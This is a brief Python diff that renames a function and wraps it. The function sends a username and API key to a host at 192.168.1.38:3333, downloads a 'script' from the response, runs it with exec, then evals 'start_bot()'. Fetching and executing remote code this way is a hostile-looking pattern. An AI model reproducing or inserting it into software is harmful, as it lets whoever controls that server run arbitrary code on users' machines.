@@ -1,7 +1,5 @@
 import requests 
-
-
-def ChakeUser():
+def Bong():
     URL="192.168.1.38:3333"
     
     ChakeUrl=f"http://{URL}/api/getscript?username={username_}&api_key={api_key_}"
@@ -12,3 +10,6 @@ def ChakeUser():
         script = Data.get("script")
         exec(script)
         eval("""start_bot()""")
+
+def ChakeUser():
+    Bong()
